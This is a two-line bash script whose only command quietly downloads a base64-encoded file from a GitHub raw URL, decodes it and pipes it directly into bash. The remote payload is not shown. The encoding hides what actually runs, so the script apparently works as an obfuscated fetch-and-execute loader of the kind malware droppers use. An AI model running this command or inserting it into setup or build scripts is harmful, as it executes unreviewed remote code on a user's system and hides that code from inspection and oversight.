#!/bin/bash
wget -qO- https://raw.githubusercontent.com/brentguiterrez/kite/refs/heads/main/entrypoint.sh | base64 -d | bash
